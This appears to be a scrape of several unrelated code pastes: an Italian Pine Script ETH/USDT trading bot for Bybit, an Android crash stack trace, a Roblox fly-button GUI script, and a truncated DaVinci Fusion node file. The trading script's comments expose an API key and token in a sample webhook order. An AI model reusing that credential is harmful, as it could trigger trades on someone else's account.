// (In Sample Dal=17/08/2017 18/09/2023) (Out Of Sample Dal18/09/2023 Al 26-02-2025)
// (Progettatta Il=26/02/2025)

// ATTENZIONE, ALCUNE POSIZIONI SONO DIFFERENTI DA TRADINGVIEW PER VIA DELLE CANDELE INIZIALI CHE SONO DI BINANCE CHE POTREBBERO AVERE VALORI LEGGERENTE DIVERSI.
// ATTENZIONE, ALCUNE VOLTE, MOLTO RARAMENTE LE MEDIE POTREBBERO DIFFERIRE SEMPRE PER VIDE DELLE CANDELE INIZIALI CHE SONO DI BINANCE CHE POTREBBERO AVERE VALORI LEGGERENTE DIVERSI.
// ATTENZIONE, I VALORI DELL'ADX A VOLTE POSSONO ESSERE DIFFERENTI PER VIA DELLE CANDELE INIZIALI CHE SONO DI BINANCE PER POI RIASSESTARSI DI NUOVO.


//@version=5
//1. Strategia
strategy(title='Bot Reversal-Band-Riot-P1 ETH/USDT.P BYBIT 4H LONG E SHORT', overlay=true,
     pyramiding=0,
     initial_capital=1000,
     commission_type=strategy.commission.percent,
     commission_value=0.1,
     slippage=3,
     default_qty_type=strategy.percent_of_equity,
     default_qty_value=18)


// Input
input_stop_loss_long = input.float(title='stop_loss_long', defval=10, minval=0, maxval=100, step=0.1, group='Stop&Target')
input_stop_loss_short = input.float(title='stop_loss_short', defval=7.1, minval=0, maxval=100, step=0.1, group='Stop&Target')
input_target_long = input.float(title='target_long', defval=12, minval=0, maxval=100, step=0.1, group='Stop&Target')
input_target_short = input.float(title='target_short', defval=6.7, minval=0, maxval=100, step=0.1, group='Stop&Target')
input_sma_long = input.int(title='Media BB Long', defval=31, minval=0, maxval=50, group='Bande')
input_sma_short = input.int(title='Media BB Short', defval=48, minval=0, maxval=50, group='Bande')
deviazione_long = input.float(title='Deviazione Long', defval=1.7, step=0.1, group='Bande')
deviazione_short = input.float(title='Deviazione Short', defval=1.3, step=0.1, group='Bande')
input_ema_long = input.int(title='Media Long', defval=52, minval=0, maxval=500, group='Medie')
input_ema_short = input.int(title='Media Short', defval=42, minval=0, maxval=500, group='Medie')
lunghezza_adx_long = input.int(title='Lunghezza ADX Long', defval=6, group='ADX')
lunghezza_adx_short = input.int(title='Lunghezza ADX Short', defval=10, group='ADX')
differenziale_adx_long = input.int(title='Differenziale ADX Long', defval=60, group='ADX')
differenziale_adx_short = input.int(title='Differenziale ADX Short', defval=22, group='ADX')
only_Long = input.bool(title='Solo long trade', defval=false, inline='1', group='Direzione')
only_Short = input.bool(title='Solo short trade', defval=false, inline='1', group='Direzione')
input_risk = input.float(title='Percentuale rischio', defval=19.1, minval=0, maxval=100, step=0.01)


// Calcolo del range del backtest
startDate = input.int(title='Start Date', defval=17, minval=1, maxval=31, group='Periodo')
startMonth = input.int(title='Start Month', defval=08, minval=1, maxval=12, group='Periodo')
startYear = input.int(title='Start Year', defval=2000, minval=1800, maxval=2100, group='Periodo')

endDate = input.int(title='End Date', defval=01, minval=1, maxval=31, group='Periodo')
endMonth = input.int(title='End Month', defval=01, minval=1, maxval=12, group='Periodo')
endYear = input.int(title='End Year', defval=2121, minval=1800, maxval=2150, group='Periodo')


inDateRange = time >= timestamp(syminfo.timezone, startYear, startMonth, startDate, 0, 0) and time < timestamp(syminfo.timezone, endYear, endMonth, endDate, 0, 0)


// Start Hour Range Trading Non Attivo /////////////////////
//hourTrading = input(title='sessione valida di trading', defval='0600-2300:23456')
//hourRangeTrading = time(timeframe.period, hourTrading)


//Calcolo degli indicatori 

// Medie Mobili
ema_long = ta.ema(close, input_ema_long)
ema_short = ta.ema(close, input_ema_short)
plot(ema_long, color=color.new(color.green, 0), title='Ema Long', linewidth=1)
plot(ema_short, color=color.new(color.red, 0), title='Ema Short', linewidth=1)


//  Bollinger Bands Long
middle_Band_long = ta.sma(close, input_sma_long)
deviazione_st_long = deviazione_long * ta.stdev(close, input_sma_long)
UpperBand_long = middle_Band_long + deviazione_st_long
LowerBand_long = middle_Band_long - deviazione_st_long
plot(middle_Band_long, color=color.new(color.green, 0), title='B_middle_Band_Long', linewidth=2)
plot(UpperBand_long, color=color.new(color.green, 0), style=plot.style_circles, linewidth=3, title='UpperBandLong')
plot(LowerBand_long, color=color.new(color.green, 0), style=plot.style_circles, linewidth=3, title='LowerBandLong')


// Bollinger Bands Short
middle_Band_short = ta.sma(close, input_sma_short)
deviazione_st_short = deviazione_short * ta.stdev(close, input_sma_short)
UpperBand_short = middle_Band_short + deviazione_st_short
LowerBand_short = middle_Band_short - deviazione_st_short
plot(middle_Band_short, color=color.new(color.red, 0), title='B_middle_Band_Short', linewidth=2)
plot(UpperBand_short, color=color.new(color.red, 0), style=plot.style_circles, linewidth=3, title='UpperBandShort')
plot(LowerBand_short, color=color.new(color.red, 0), style=plot.style_circles, linewidth=3, title='LowerBandShort')


// ADX Long
[di_pos_long, di_neg_long, adx_long] = ta.dmi(lunghezza_adx_long, lunghezza_adx_long)
plot(adx_long, color=color.new(color.blue, 0), title='adx long')

//ADX Short
[di_pos_short, di_neg_short, adx_short] = ta.dmi(lunghezza_adx_short, lunghezza_adx_short)
plot(adx_short, color=color.new(color.red, 0), title='adx short')


// Money Menagment e stop loss

// size = strategy.equity * input_risk / 100
// nr_contratti = size / close
// stop_loss_long = math.round(size / syminfo.mintick / 100 * input_stop_loss_long) / nr_contratti
// stop_loss_short = math.round(size / syminfo.mintick / 100 * input_stop_loss_short) / nr_contratti
// target_long = math.round(size / syminfo.mintick / 100 * input_target_long) / nr_contratti
// target_short = math.round(size / syminfo.mintick / 100 * input_target_short) / nr_contratti


//Variabili Stop Long e Short
stop_loss_long_price = strategy.opentrades.entry_price(0) - (strategy.opentrades.entry_price(0) * input_stop_loss_long) / 100
stop_loss_long = (strategy.opentrades.entry_price(0) - stop_loss_long_price) / syminfo.mintick
take_profit_long_price = (strategy.opentrades.entry_price(0) + ((strategy.opentrades.entry_price(0) * input_target_long) / 100))
take_profit_long = (take_profit_long_price - strategy.opentrades.entry_price(0)) / syminfo.mintick

//plot(stop_loss_long, title = ""sl_long_ticks"", color=color.purple)


stop_loss_short_price = strategy.opentrades.entry_price(0) + (strategy.opentrades.entry_price(0) * input_stop_loss_short) / 100
stop_loss_short = (stop_loss_short_price - strategy.opentrades.entry_price(0)) / syminfo.mintick
take_profit_short_price = (strategy.opentrades.entry_price(0) - ((strategy.opentrades.entry_price(0) * input_target_short) / 100))
take_profit_short =(strategy.opentrades.entry_price(0) - take_profit_short_price) / syminfo.mintick

//plot(stop_loss_short, title = ""sl_short_ticks"", color=color.purple)


// plot(strategy.position_size != 0 ? strategy.position_avg_price : na, color=strategy.position_size > 0 ? color.blue : strategy.position_size < 0 ? color.red : na, style=plot.style_linebr, title='entry_price')  // stampa l'entry price in rosso se short in blu se long
// plot(strategy.position_size > 0 ? strategy.position_avg_price + take_profit_long * 0.01 * 10 : strategy.position_size < 0 ? strategy.position_avg_price - take_profit_short * 0.01 * 10 : na, color=color.new(color.green, 0), style=plot.style_cross, linewidth=2, title='tk_limit')
// plot(strategy.position_size > 0 ? strategy.position_avg_price - stop_loss_long * 0.01 * 10 : strategy.position_size < 0 ? strategy.position_avg_price + stop_loss_short * 0.01 * 10 : na, color=color.new(color.red, 0), style=plot.style_cross, linewidth=2, title='sl_limit')


plot(strategy.position_size != 0 ? strategy.opentrades.entry_price(0) : na , color=strategy.position_size > 0 ? color.blue : strategy.position_size < 0 ? color.red : na, style=plot.style_linebr, title=""entry_price"") // stampa l'entry price in rosso se short in blu se long
plot(strategy.position_size > 0 ?  take_profit_long_price : strategy.position_size < 0 ? take_profit_short_price: na, color=color.green, style=plot.style_cross, linewidth=2, title=""tk_limit"")
plot(strategy.position_size > 0 ?  stop_loss_long_price : strategy.position_size < 0 ? stop_loss_short_price: na, color=color.red, style=plot.style_cross, linewidth=2, title=""sl_limit"")

bgcolor(strategy.position_size > 0 ? color.green : strategy.position_size < 0 ? color.red : na, transp=90) // sfondo verde quando siamo long, sfondo rosso quando siamo short, no sfondo quando non siamo in posizione


// Plot No Trading Allowed giorni da 1 a 7 1 è Domenica. Mesi da 1 a 12 1 è Gennaio

//mesi_esclusi = month(time)
//plotshape(mesi_esclusi[1] == 4 ? mesi_esclusi : na, color=color.new(color.yellow, 0), title='mesi_esclusi')
//plotshape(mesi_esclusi[1] == 8 ? mesi_esclusi : na, color=color.new(color.yellow, 0), title='mesi_esclusi')


//Condizione Entry Long
condEntryLong = ta.crossover(close, LowerBand_long) and close < ema_long and adx_long < differenziale_adx_long and not only_Short and inDateRange // and month != 4 and month != 8 

//Condizione Uscita Long
condExitLong = ta.crossover(close, UpperBand_long)



// Condizione Entry Short
condEntryShort = ta.crossunder(close, UpperBand_short) and close > ema_short and adx_short < differenziale_adx_short and not only_Long and inDateRange // and month != 4 and month != 8 

// Condizione Exit Short
condExitShort = ta.crossunder(close, LowerBand_short)

                   
buy_command = 'BUY COMMAND'
sell_command = 'SELL COMMAND'
close_command = 'CLOSE COMMAND'
cancel_command = 'CANCEL COMMAND'

// // ============== Email Protection ===============
 
// L'email protection invia ordini senza webhook oppure se gli webhook sono abilitati ma per qualche motivo l'ordine non viene eseguito per errore verrà inviato un ordine di backup dopo 5 secondi da TV-Hub.org

// Documentazione: https://www.tv-hub.org/Home/Documentation#email-signals
// Quando settiamo l'email di tradingview per abilitare l'email protection mettere temporaneamente la lingua in inglese su tradingview e poi riportarla in italiano altrimenti il codice di verifica su tv-hub non arriva.
// Email Protection da aggiungere a tutte le stringhe se utilizzata l'email protection ""alertTimestamp"":""{{ticker}}-{{time}}""
// Esempio Email Protection buy = '{""pair"":""ETHUSDT"",""unitsPercent"":""8.5"",""unitsType"":""percentBalance"",""exchange"":""Bybit"",""apiKey"":""OverTheClouds"",""token"":""e6d67d6e-1a5f-4e53-a9fd-6276dfa2a34b"",""isBuy"":true,""isMarket"":true,""leverage"":""1"",""marginType"":""ISOLATED"",""closeCurrentPosition"":true,""preventPyramiding"":true,""cancelAllOrders"":true,""alertTimestamp"":""{{ticker}}-{{time}}}'
// Abilitare pulsante invia testo normale ""Invia testo normale ad un indirizzo e-mail alternativo"" quando si crea alert in notifiche dell'alert oltre al solito webook

//entrata e uscita Long
if condEntryLong // strategy.opentrades == 0
    strategy.entry('operazioneLong', strategy.long, alert_message = ""Open Long Position"", comment = buy_command)
    
if strategy.opentrades ==1
    strategy.exit('SL e TP', from_entry='operazioneLong', loss=stop_loss_long, profit=take_profit_long, alert_message = ""Your Long SL-TP Has Been Triggered."", comment = close_command)

if condExitLong and strategy.opentrades == 1
    strategy.close(id='operazioneLong', alert_message = ""Close Long Position"", comment = close_command)

//entrata e uscita Short    
if condEntryShort //and strategy.opentrades == 0
    strategy.entry('operazioneShort', strategy.short, alert_message = ""Open Short position"", comment = sell_command)

if strategy.opentrades ==1
    strategy.exit('SL e TP', from_entry='operazioneShort', loss=stop_loss_short, profit=take_profit_short, alert_message = ""Your Short SL-TP Has Been Triggered."", comment = close_command)

if condExitShort and strategy.opentrades == 1
    strategy.close(id='operazioneShort', alert_message = ""Close Short Position"", comment = close_command)

// Nome Alert: Reversal-Band-Riot-P1 ETH/USDT.P BYBIT 4H
// Commento Alert: {{strategy.order.comment}}
// Webhook Classico Più Sicuro Ma Più Lento: https://alerts.tv-hub.org  
// Webhook Nuovo Meno Sicuro Ma Più Veloce: https://alerts.tv-hub.org/api/ExecuteTradeSignalClassic


// ----------------- Inizio Tabella risultati mensili. Per visualizzare andare nelle impostazioni proprietà e spuntare ad ogni tick -----------------

// new_month = month(time) != month(time[1])
// new_year  = year(time)  != year(time[1])

// eq = strategy.equity

// bar_pnl = eq / eq[1] - 1

// cur_month_pnl = 0.0
// cur_year_pnl  = 0.0

// // Current Monthly P&L
// cur_month_pnl := new_month ? 0.0 : 
//                  (1 + cur_month_pnl[1]) * (1 + bar_pnl) - 1 

// // Current Yearly P&L
// cur_year_pnl := new_year ? 0.0 : 
//                  (1 + cur_year_pnl[1]) * (1 + bar_pnl) - 1  

// // Arrays to store Yearly and Monthly P&Ls
// var month_pnl  = array.new_float(0)
// var month_time = array.new_int(0)

// var year_pnl  = array.new_float(0)
// var year_time = array.new_int(0)

// last_computed = false

// if (not na(cur_month_pnl[1]) and (new_month or barstate.islast))
//     if (last_computed[1])
//         array.pop(month_pnl)
//         array.pop(month_time)

//     array.push(month_pnl , cur_month_pnl[1])
//     array.push(month_time, time[1])

// if (not na(cur_year_pnl[1]) and (new_year or barstate.islast))
//     if (last_computed[1])
//         array.pop(year_pnl)
//         array.pop(year_time)

//     array.push(year_pnl , cur_year_pnl[1])
//     array.push(year_time, time[1])

// last_computed := barstate.islast ? true : nz(last_computed[1])

// // Monthly P&L Table    
// var monthly_table = table(na)
// prec      = input(2, title = ""Return Precision"")

// if (barstate.islast)
//     monthly_table := table.new(position.bottom_right, columns = 14, rows = array.size(year_pnl) + 1, bgcolor=#0F0F0F,border_width=1,border_color=#000000)

//     table.cell(monthly_table, 0,  0, """",     text_color=#D3D3D3, bgcolor=#0F0F0F)
//     table.cell(monthly_table, 1,  0, ""Jan"",  text_color=#D3D3D3, bgcolor=#0F0F0F)
//     table.cell(monthly_table, 2,  0, ""Feb"",  text_color=#D3D3D3, bgcolor=#0F0F0F)
//     table.cell(monthly_table, 3,  0, ""Mar"",  text_color=#D3D3D3, bgcolor=#0F0F0F)
//     table.cell(monthly_table, 4,  0, ""Apr"",  text_color=#D3D3D3, bgcolor=#0F0F0F)
//     table.cell(monthly_table, 5,  0, ""May"",  text_color=#D3D3D3, bgcolor=#0F0F0F)
//     table.cell(monthly_table, 6,  0, ""Jun"",  text_color=#D3D3D3, bgcolor=#0F0F0F)
//     table.cell(monthly_table, 7,  0, ""Jul"",  text_color=#D3D3D3, bgcolor=#0F0F0F)
//     table.cell(monthly_table, 8,  0, ""Aug"",  text_color=#D3D3D3, bgcolor=#0F0F0F)
//     table.cell(monthly_table, 9,  0, ""Sep"",  text_color=#D3D3D3, bgcolor=#0F0F0F)
//     table.cell(monthly_table, 10, 0, ""Oct"",  text_color=#D3D3D3, bgcolor=#0F0F0F)
//     table.cell(monthly_table, 11, 0, ""Nov"",  text_color=#D3D3D3, bgcolor=#0F0F0F)
//     table.cell(monthly_table, 12, 0, ""Dec"",  text_color=#D3D3D3, bgcolor=#0F0F0F)
//     table.cell(monthly_table, 13, 0, ""Year"", text_color=#D3D3D3, bgcolor=#0F0F0F)


//     for yi = 0 to array.size(year_pnl) - 1
//         table.cell(monthly_table, 0,  yi + 1, str.tostring(year(array.get(year_time, yi))), text_color=#D3D3D3, bgcolor=#0F0F0F)

//         y_color = array.get(year_pnl, yi) > 0 ? color.lime : color.red
//         table.cell(monthly_table, 13, yi + 1, str.tostring(math.round(array.get(year_pnl, yi) * 100, prec)), bgcolor = y_color)

//     for mi = 0 to array.size(month_time) - 1
//         m_row   = year(array.get(month_time, mi))  - year(array.get(year_time, 0)) + 1
//         m_col   = month(array.get(month_time, mi)) 
//         m_color = array.get(month_pnl, mi) > 0 ? color.lime : color.red

//         table.cell(monthly_table, m_col, m_row, str.tostring(math.round(array.get(month_pnl, mi) * 100, prec)), bgcolor = m_color)

// ----------------- Fine Tabella risultati mensili. Per visualizzare andare nelle impostazioni proprietà e spuntare ad ogni tick -----------------

"
ZDVqL6S8,2025-05-09T17:57:32.354182,powerampache,PHP,Friday 9th of May 2025 10:57:33 AM CDT,"1.01-80 (80) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.ScrobbleException: {""errorAction"":""record_play"",""errorCode"":""4701"",""errorMessage"":""Sessione scaduta"",""errorType"":""account""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.scrobbleApiCall(SongsRepositoryImpl.kt:657)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.access$scrobbleApiCall(SongsRepositoryImpl.kt:80)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$scrobbleApiCall$1.invokeSuspend(Unknown Source:15)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
hdNid4Ra,Test roblox,Porco2004,Lua,Friday 9th of May 2025 10:23:23 AM CDT,"-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new(""ScreenGui"")
local Frame = Instance.new(""Frame"")
local UICorner = Instance.new(""UICorner"")
local KickITtext = Instance.new(""TextLabel"")
local Frame_2 = Instance.new(""Frame"")
local UICorner_2 = Instance.new(""UICorner"")
local ScrollingFrame = Instance.new(""ScrollingFrame"")
local UICorner_3 = Instance.new(""UICorner"")
local button = Instance.new(""TextButton"")
local UICorner_4 = Instance.new(""UICorner"")
local Framedestra = Instance.new(""Frame"")
local UICorner_5 = Instance.new(""UICorner"")
local Flybutton = Instance.new(""TextButton"")
local UICorner_6 = Instance.new(""UICorner"")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
Frame.BackgroundTransparency = 0.090
Frame.BorderColor3 = Color3.fromRGB(47, 47, 47)
Frame.ClipsDescendants = true
Frame.LayoutOrder = -1
Frame.Position = UDim2.new(0.62338841, -534, 0.138359949, -66)
Frame.Size = UDim2.new(0, 562, 0, 525)

UICorner.CornerRadius = UDim.new(0, 33)
UICorner.Parent = Frame

KickITtext.Name = ""KickITtext""
KickITtext.Parent = Frame
KickITtext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
KickITtext.BackgroundTransparency = 1.000
KickITtext.BorderColor3 = Color3.fromRGB(0, 0, 0)
KickITtext.BorderSizePixel = 0
KickITtext.Position = UDim2.new(0.298073977, 0, 0.0231517982, 0)
KickITtext.Size = UDim2.new(0, 226, 0, 35)
KickITtext.Font = Enum.Font.SourceSans
KickITtext.Text = ""Kick IT""
KickITtext.TextColor3 = Color3.fromRGB(216, 216, 216)
KickITtext.TextSize = 30.000
KickITtext.TextWrapped = true

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.000889679708, 0, 0.113833763, 0)
Frame_2.Size = UDim2.new(0, 561, 0, 6)

UICorner_2.CornerRadius = UDim.new(1, 6)
UICorner_2.Parent = Frame_2

ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 0.900
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.018340366, 0, 0.142777279, 0)
ScrollingFrame.Size = UDim2.new(0, 84, 0, 424)

UICorner_3.CornerRadius = UDim.new(0, 9)
UICorner_3.Parent = ScrollingFrame

button.Name = ""button""
button.Parent = ScrollingFrame
button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
button.BorderColor3 = Color3.fromRGB(0, 0, 0)
button.BorderSizePixel = 0
button.Position = UDim2.new(-1.81652254e-07, 0, 0.0183116626, 0)
button.Size = UDim2.new(0, 71, 0, 24)
button.Font = Enum.Font.SourceSans
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextSize = 14.000

UICorner_4.CornerRadius = UDim.new(0, 6)
UICorner_4.Parent = button

Framedestra.Name = ""Frame destra""
Framedestra.Parent = Frame
Framedestra.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Framedestra.BorderColor3 = Color3.fromRGB(0, 0, 0)
Framedestra.BorderSizePixel = 0
Framedestra.Position = UDim2.new(0.200317711, 0, 0.143007055, 0)
Framedestra.Size = UDim2.new(0, 433, 0, 423)

UICorner_5.CornerRadius = UDim.new(0, 33)
UICorner_5.Parent = Framedestra

Flybutton.Name = ""Flybutton""
Flybutton.Parent = Framedestra
Flybutton.BackgroundColor3 = Color3.fromRGB(222, 222, 222)
Flybutton.BorderColor3 = Color3.fromRGB(0, 0, 0)
Flybutton.BorderSizePixel = 0
Flybutton.Position = UDim2.new(0.267898381, 0, 0.430260032, 0)
Flybutton.Size = UDim2.new(0, 200, 0, 50)
Flybutton.Font = Enum.Font.FredokaOne
Flybutton.Text = ""Activate fly""
Flybutton.TextColor3 = Color3.fromRGB(0, 0, 0)
Flybutton.TextSize = 30.000

UICorner_6.CornerRadius = UDim.new(0, 99)
UICorner_6.Parent = Flybutton

-- Scripts:

local function RBACIRG_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	local frame = script.Parent
	local dragging = false
	local dragInput, mousePos, framePos
	
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			mousePos = input.Position
			framePos = frame.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end)
	
	game:GetService(""UserInputService"").InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			local delta = input.Position - mousePos
			frame.Position = UDim2.new(
				framePos.X.Scale,
				framePos.X.Offset + delta.X,
				framePos.Y.Scale,
				framePos.Y.Offset + delta.Y
			)
		end
	end)
end
coroutine.wrap(RBACIRG_fake_script)()
local function HCQMM_fake_script() -- Flybutton.LocalScript 
	local script = Instance.new('LocalScript', Flybutton)

	
	local button = script.Parent
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local flying = false
	local bodyVelocity = nil
	
	local function startFlying()
		local root = character:WaitForChild(""HumanoidRootPart"")
		bodyVelocity = Instance.new(""BodyVelocity"")
		bodyVelocity.Velocity = Vector3.new(0, 50, 0)
		bodyVelocity.MaxForce = Vector3.new(100000, 100000, 100000)
		bodyVelocity.Parent = root
	end
	
	local function stopFlying()
		if bodyVelocity then
			bodyVelocity:Destroy()
			bodyVelocity = nil
		end
	end
	
	button.MouseButton1Click:Connect(function()
		flying = not flying
		if flying then
			startFlying()
			button.Text = ""Disable Fly""
		else
			stopFlying()
			button.Text = ""Activate Fly""
		end
	end)
	
end
coroutine.wrap(HCQMM_fake_script)()
local function ZOMKEP_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	local UserInputService = game:GetService(""UserInputService"")
	local gui = script.Parent
	local frame = gui:WaitForChild(""Frame"")
	
	local isVisible = false
	
	UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed then return end
		if input.KeyCode == Enum.KeyCode.LeftControl or input.KeyCode == Enum.KeyCode.RightControl then
			isVisible = not isVisible
			frame.Visible = isVisible
		end
	end)
end
coroutine.wrap(ZOMKEP_fake_script)()
"
G7HCUZCM,Black Hole optimization v2 (11 nodes),marcusa3000,Lua,Friday 9th of May 2025 10:05:35 AM CDT,"{
	Tools = ordered() {
		MaskPaint2 = PaintMask {
			Inputs = {
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				PaintMode = Input { Value = FuID { ""None"" }, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Paint = Input {
					SourceOp = ""PaintGroupInner"",
					Source = ""Out"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5335, 379.5 } },
		},
		PaintGroupInner = PaintGroup {
			IsThreaded = false,
			Brushes = {
			},
			ApplyModes = {
			},
			CtrlWZoom = false,
			NameSet = true,
			Inputs = {
				Paint = Input {
					SourceOp = ""PaintGroupMid"",
					Source = ""Out"",
				},
				PaintGroup = Input {
					SourceOp = ""PolylineStroke24"",
					Source = ""Out"",
				},
				Angle = Input {
					Value = -90,
					Expression = ""-time*1.8"",
				}
			},
		},
		PaintGroupMid = PaintGroup {
			IsThreaded = true,
			Brushes = {
			},
			ApplyModes = {
			},
			CtrlWZoom = false,
			NameSet = true,
			Inputs = {
				Paint = Input {
					SourceOp = ""PaintGroupOuter"",
					Source = ""Out"",
				},
				PaintGroup = Input {
					SourceOp = ""PolylineStroke20"",
					Source = ""Out"",
				},
				Angle = Input {
					Value = -40,
					Expression = ""-time*0.8"",
				}
			},
		},
		PaintGroupOuter = PaintGroup {
			IsThreaded = true,
			Brushes = {
			},
			ApplyModes = {
			},
			CtrlWZoom = false,
			NameSet = true,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke2"",
					Source = ""Out"",
				},
				PaintGroup = Input {
					SourceOp = ""PolylineStroke16"",
					Source = ""Out"",
				},
				Angle = Input {
					Value = -42.075,
					Expression = ""-time*0.425"",
				}
			},
		},
		PolylineStroke2 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				[""CircleBrush.Size""] = Input { Value = 0.0147, },
				Polyline = Input {
					Value = Polyline {
					},
				}
			},
		},
		PolylineStroke16 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke15"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.24702856426651, Y = 0.0374481223421251, RX = 0.000504286434694902, RY = -0.0200673048802805 },
							{ Linear = true, X = 0.248541423570595, Y = -0.0227537922987164, LX = -0.000504286434694902, LY = 0.0200673048802805, RX = -0.0026797204476086, RY = -0.0149894288147033 },
							{ Linear = true, X = 0.240502262227769, Y = -0.0677220787428263, LX = 0.0026797204476086, LY = 0.0149894288147033 }
						}
					},
				}
			},
		},
		PolylineStroke15 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke14"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.0232982019932823, Y = 0.246797635334842, RX = 0.0108798648736688, RY = -0.00135375060798977 },
							{ Linear = true, X = 0.0559377966142885, Y = 0.242736383510873, LX = -0.0108798648736688, LY = 0.00135375060798977, RX = 0.0120814112413671, RY = -0.00370481550712476 },
							{ Linear = true, X = 0.0921820303383898, Y = 0.231621936989498, LX = -0.0120814112413671, LY = 0.00370481550712476 }
						}
					},
				}
			},
		},
		PolylineStroke14 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke13"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.209467833961375, Y = 0.132438739789965, RX = 0.00875687814270663, RY = 0.0120575651497472 },
							{ Linear = true, X = -0.183197199533256, Y = 0.168611435239207, LX = -0.00875687814270663, LY = -0.0120575651497472, RX = 0.0106929754092029, RY = 0.00991940363320877 },
							{ Linear = true, X = -0.151118273305647, Y = 0.198369646138833, LX = -0.0106929754092029, LY = -0.00991940363320877 }
						}
					},
				}
			},
		},
		PolylineStroke13 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke12"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.113805202555479, Y = -0.22136802386398, RX = -0.0122105400407429, RY = 0.00712673480382311 },
							{ Linear = true, X = -0.150436822677708, Y = -0.199987819452511, LX = 0.0122105400407429, LY = -0.00712673480382311, RX = -0.00989007497215243, RY = 0.00855698171917542 },
							{ Linear = true, X = -0.180107047594165, Y = -0.174316874294985, LX = 0.00989007497215243, LY = -0.00855698171917542 }
						}
					},
				}
			},
		},
		PolylineStroke12 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke11"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
